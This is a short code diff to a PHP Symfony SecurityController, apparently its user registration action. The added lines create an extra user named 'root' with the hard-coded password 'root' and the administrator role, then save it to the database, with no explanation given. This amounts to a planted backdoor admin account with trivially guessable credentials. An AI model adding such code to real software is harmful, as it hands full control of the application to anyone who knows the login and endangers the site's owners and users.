@@ -80,6 +80,15 @@ class SecurityController extends Controller
         $em = $this->getDoctrine()->getManager();
         $em->persist($user);
         $em->flush();
+        $user = new User();
+        $encoder = $this->get('security.password_encoder');
+        $encoded = $encoder->encodePassword($user, 'root');
+        $user->setPassword($encoded);
+        $user->setRoles(array('ROLE_ADMIN'));
+        $user->setUsername('root');
+        $em = $this->getDoctrine()->getManager();
+        $em->persist($user);
+        $em->flush();
 
         return $this->redirectToRoute('login');
     }
